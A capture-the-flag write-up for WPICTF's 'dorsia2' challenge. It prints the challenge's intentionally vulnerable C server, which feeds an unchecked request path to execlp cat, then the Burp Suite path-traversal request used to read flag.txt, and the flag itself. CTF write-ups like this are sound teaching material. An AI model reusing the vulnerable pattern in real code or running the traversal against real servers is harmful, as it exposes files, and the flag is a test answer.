# dorsia2

This was the last challenge we could solve in time.

This wasn't a hard one though we had to think a bit for it to work. I didn't get it to work with Chromium, so I ended up using
BURP Suite and Firefox. We were given an webm video with source code:
[dorsia.webm](http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm). The interesting time was the 22nd second.

The piece of code I analyzed was the following:

```C

#include <stdio.h>

void main() {

    char a[69] = {0};
    scanf("GET /%s", &a);
    printf("HTTP 200 \r\n\r\n");
    fflush(stdout);
    execlp("cat",a,a,0);
}

//run in /home/ctf/web
```

Thus knowing it was possibly a path traversal, we tried that out. All to no avail.

Thus we loaded Burp Suite. (There was no issue earlier with the page. The images are of a later date.)

Then when we sent the target to the intruder, all we would get was `HTTP 200`. Thus we used our code analysis and sent
`HTTP 200` in the body with the path traversal included:

```HTTP

GET /../flag.txt HTTP/1.1
Host: dorsia2.wpictf.xyz:31337
User-Agent: Firefox/75.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 8

HTTP 200
```

Which returned

```HTTP
HTTP 200

WPI{1_H4VE_2_return_SOME_VIDE0TAP3S}
```

Thus including our flag.

The flag was `WPI{1_H4VE_2_return_SOME_VIDE0TAP3S}`

Entering this flag gave us our last **50** points. Bringing our total to **526** points. And we ended at the **186th** place.
